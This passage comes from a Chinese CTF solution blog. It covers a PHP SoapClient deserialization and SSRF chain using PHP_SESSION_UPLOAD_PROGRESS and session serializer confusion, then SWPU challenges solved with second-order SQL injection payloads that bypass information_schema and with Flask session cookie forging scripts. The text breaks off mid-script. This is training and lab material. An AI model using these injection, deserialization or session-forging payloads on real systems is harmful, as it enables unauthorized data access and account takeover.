class="variable">$mod1</span>;</span><br><span class="line">    public <span class="variable">$mod2</span>;</span><br><span class="line">&#125;</span><br><span class="line">class bb</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$mod1</span>;</span><br><span class="line">    public <span class="variable">$mod2</span>;</span><br><span class="line">&#125;</span><br><span class="line">class cc</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$mod1</span>;</span><br><span class="line">    public <span class="variable">$mod2</span>;</span><br><span class="line">    public <span class="variable">$mod3</span>;</span><br><span class="line">&#125;</span><br><span class="line">class dd</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$flag</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">class ee</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$str1</span>;</span><br><span class="line">    public <span class="variable">$str2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=new bb;</span><br><span class="line"><span class="variable">$a</span>=new aa;</span><br><span class="line"><span class="variable">$b</span>-&gt;mod1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=new cc;</span><br><span class="line"><span class="variable">$a</span>-&gt;mod2[<span class="string">'test2'</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$e</span>=new ee;</span><br><span class="line"><span class="variable">$c</span>-&gt;mod1=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$d</span>=new dd;</span><br><span class="line"><span class="variable">$e</span>-&gt;str1=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;str2=<span class="string">"getflag"</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;flag=&#123;1&#125;;</span><br><span class="line"><span class="variable">$d</span>-&gt;b=&#123;2&#125;;</span><br></pre></td></tr></table></figure></p>
<p>先把soapclient对象反序列化的数据写入session，再在2处填call_user_func调用SoapClient<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br><span class="line">通过函数的方式回调</span><br><span class="line"><span class="keyword">function</span> barber(<span class="variable">$type</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"you wanted a <span class="variable">$type</span> haircut, no problem\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'barber'</span>,<span class="string">'mushroom'</span>);</span><br><span class="line"></span><br><span class="line">通过类名、对象的方式回调</span><br><span class="line">class myclass&#123;</span><br><span class="line">    static <span class="keyword">function</span> <span class="function"><span class="title">say_hello</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"hello!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$classname</span> = <span class="string">"myclass"</span>;</span><br><span class="line">//通过数组键值的方式，对类名进行回调，回调类名里面的，say_hello方法</span><br><span class="line">call_user_func(array(<span class="variable">$classname</span>,<span class="string">'say_hello'</span>));</span><br><span class="line"> </span><br><span class="line">//通过类名直接调用静态方法</span><br><span class="line">call_user_func(<span class="variable">$classname</span> .<span class="string">'::say_hello'</span>); // As of 5.2.3// <span class="variable">$myobject</span> = new myclass();</span><br><span class="line"> </span><br><span class="line">//通过对象的方式回调</span><br><span class="line"><span class="variable">$myobject</span> = new myclass();</span><br><span class="line">call_user_func(array(<span class="variable">$myobject</span>, <span class="string">'say_hello'</span>));</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#interface.php</span></span><br><span class="line"> &lt;?php   </span><br><span class="line">    include(<span class="string">'Service.php'</span>);</span><br><span class="line">    <span class="variable">$ser</span> = new SoapServer(<span class="string">'Service.wsdl'</span>,array(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    <span class="variable">$ser</span>-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    <span class="variable">$ser</span>-&gt;handle();</span><br><span class="line">?&gt; </span><br><span class="line">测试代码</span><br><span class="line"><span class="comment">#server.php</span></span><br><span class="line">&lt;?php </span><br><span class="line">class Service</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Get_flag</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"flag&#123;xxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = new SoapServer(null,array(<span class="string">'uri'</span>=&gt;<span class="string">'sampleA'</span>));</span><br><span class="line"><span class="variable">$ser</span>-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line"><span class="variable">$ser</span>-&gt;handle();</span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#client</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$client</span> = new SoapClient(null, array(</span><br><span class="line">        <span class="string">'location'</span>=&gt;<span class="string">'http://127.0.0.1/soap/server.php'</span>,</span><br><span class="line">        <span class="string">'uri'</span>=&gt;<span class="string">'sampleA'</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span>-&gt;Get_flag(); //flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
<p>当客户端实例化了SoapClient后，就可以调用到Service类中的任意方法，并通过return得到回显<br>而如果我们仅仅是通过SoapClient调用不存在的方法触发ssrf，是不会得到回显的，可以本地测一下就知道了，而这里Service类的get_flag方法<br>显然是需要通过回显来得到flag。这就需要利用SoapServer。<br>所以我们通过反序列化SoapClient类，location指向interface.php即服务端，因为服务端的setClass为Service类，而Get_flag方法在Service<br>类中，最后我们通过call_user_func调用SoapClient类的Get_flag方法即调用了Service类的Get_flag方法。<br>所以1的位置要写调用的方法Get_flag</p>
<h3 id="PHP-SESSION-UPLOAD-PROGRESS上传文件"><a href="#PHP-SESSION-UPLOAD-PROGRESS上传文件" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS上传文件"></a>PHP_SESSION_UPLOAD_PROGRESS上传文件</h3><p>参考<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a><br>构造上传文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.html</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://a3aff44b-21bc-4903-b8a4-434700b1be98.node3.buuoj.cn/index.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">        &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value=<span class="string">"1"</span> /&gt;</span><br><span class="line">        &lt;input <span class="built_in">type</span>=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">        &lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">写入session ⽂件中的内容的payload为</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$target</span> = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">'a=1&amp;b=2'</span>;</span><br><span class="line"><span class="variable">$headers</span> = array(</span><br><span class="line"> <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line"> <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> );</span><br><span class="line"><span class="variable">$b</span> = new SoapClient(null,array(<span class="string">'location'</span> =&gt;</span><br><span class="line"><span class="variable">$target</span>,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-formurlencoded^^'</span>.join(<span class="string">'^^'</span>,<span class="variable">$headers</span>),<span class="string">'uri'</span></span><br><span class="line">=&gt; <span class="string">"aaab"</span>));</span><br><span class="line"><span class="variable">$aaa</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(<span class="variable">$aaa</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>写⼊session ⽂件的内容url编码之后<code>在开头加上|</code>上传<br><img src="https://uploader.shimo.im/f/oDYWoFskQfwLkPmw.png!thumbnail" alt></p>
<p>为什么要加|呢，参考<a href="https://www.anquanke.com/post/id/164569#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569#h3-7</a><br>session里的内容是会被进行一次序列化写入的例如 name|s:3:”sky”<br>控制session.serialize_handler,可以指定序列化引擎<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"> php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"> php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br><span class="line"> </span><br><span class="line">假如我们使用`php_serialize`引擎时进行数据存储时的序列化，可以得到内容</span><br><span class="line"><span class="variable">$_SESSION</span>[‘name’] = ‘sky’;</span><br><span class="line">a:1:&#123;s:4:”name”;s:3:”sky”;&#125;</span><br><span class="line"></span><br><span class="line">而在php引擎时进行数据存储时的序列化，可以得到另一个内容</span><br><span class="line"><span class="variable">$_SESSION</span>[‘name’] = ‘sky’;</span><br><span class="line">name|s:3:”sky”</span><br><span class="line"></span><br><span class="line">用php引擎去解php_serialize得到的序列化,php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入</span><br><span class="line"><span class="variable">$_SESSION</span>[‘name’] = ‘|sky‘</span><br><span class="line">那么使用php_serialize引擎时可以得到序列化内容</span><br><span class="line"></span><br><span class="line">a:1:&#123;s:4:”name”;s:4:”|sky”;&#125;</span><br><span class="line">然后用php引擎反序列化时，|被当做分隔符，于是</span><br><span class="line"></span><br><span class="line">a:1:&#123;s:4:”name”;s:4:”</span><br><span class="line">被当作key</span><br><span class="line"></span><br><span class="line">sky</span><br><span class="line">被当做vaule进行反序列化</span><br><span class="line"></span><br><span class="line">于是，我们只要传入</span><br><span class="line"><span class="variable">$_SESSION</span>[‘name’] = |序列化内容</span><br><span class="line">即可</span><br></pre></td></tr></table></figure></p>
<p>为什么能反序列化呢<br><img src="https://p2.ssl.qhimg.com/t01f1c17eaf55f62f7b.png" alt><br>上面写入session ⽂件中的内容的payload开头加|，就是直接上传了一个php_serialize类型的反序列化结果，然后后面再用php引擎解析</p>
<h3 id="利⽤se-php进⾏2次反序列化"><a href="#利⽤se-php进⾏2次反序列化" class="headerlink" title="利⽤se.php进⾏2次反序列化"></a>利⽤se.php进⾏2次反序列化</h3><p>第一步se.php简单的反序列化(exp上面已写)，触发第二步session的反序列化<br><img src="https://uploader.shimo.im/f/59Gqe225jOMtLOv2.png!thumbnail" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/12/swpu刷题记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/12/swpu刷题记录/" itemprop="url">swpu刷题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-12T10:21:59+08:00">
                2020-01-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>进去一看一个登陆框。注册个账号登陆后，有个发布广告的功能，发布之后查看，怀疑存在二次注入<br>试了一下发现存在二次注入，注入点在标题处，过滤了ordey by 用group by判断出有22列<br>回显位置是 2，3，库名web1，但是查表名的时候过滤了information_schema 凉凉<br>看wp学新操作<a href="https://www.anquanke.com/post/id/193512#h3-2" target="_blank" rel="noopener">聊一聊bypass information_schema</a><br>MySQL5.7的新特性<br>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema<br>两个库，本身数据库不存储数据。<br>注：利用innoDB引擎绕过对information_schema的过滤，但是mysql默认是关闭InnoDB存储引擎的<br>sys.schema_auto_increment_columns表</p>
<p>fortest库<br>    data 表存在自增id<br>    no_a_i_table 表不存在自增id<br>    test 表存在自增id<br>sys.schema_table_statistics_with_buffer和sys.x$schema_table_statistics_with_buffer包含上面所有表<br>试了一下发现buu环境没这个表<br>还是用innodb绕的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br><span class="line">出表名</span><br><span class="line"><span class="string">'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br><span class="line">出数据</span><br><span class="line"></span><br><span class="line">附上join报错出列名payload</span><br><span class="line">第一列的列名</span><br><span class="line"><span class="string">' union all select*from (select * from users as a join users b)c--+</span></span><br><span class="line"><span class="string">获取次列及后续列名</span></span><br><span class="line"><span class="string">'</span> union all select*from (select * from users as a join users b using(id,username))c--+</span><br><span class="line"></span><br><span class="line">select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x</span><br><span class="line">这部分也可以换成</span><br><span class="line">select/**/group_concat(`3`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/doA6EYgBPcQz7FHH.png!thumbnail" alt></p>
<h2 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h2><p>看了下以为是ssti结果测试下不是，upload权限不够没思路了，下面跟着wp复现一波<br>upload目录有个404 not found的提示<br>在 flask 中，可以使⽤用 app.errorhandler()装饰器来注册错误处理函数，参数是 HTTP 错误状态码或者特定的异常类，由此可以联想在 404 错误中会有东西存在<br>随便访问一个不存在的url<br><img src="https://uploader.shimo.im/f/uJiL1mFp6JogOZum.png!thumbnail" alt><br>有趣的东西出现了  Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==<br>base64解码 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<br>再联想到刚才访问upload显示的权限不够，可以判断是使用该key伪造session<br>附上p神解密session的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    <span class="keyword">if</span> payload.startswith(b<span class="string">'.'</span>):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure></p>
<p>附上flask session加密解密脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span><span class="string">" Flask Session Cookie Decoder/Encoder "</span><span class="string">""</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[0] &lt; 3: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    raise Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            <span class="string">""</span><span class="string">" Encode a Flask session cookie "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            <span class="string">""</span><span class="string">" Decode a Flask cookie  "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            <span class="string">""</span><span class="string">" Encode a Flask session cookie "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            <span class="string">""</span><span class="string">" Decode a Flask cookie  "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = 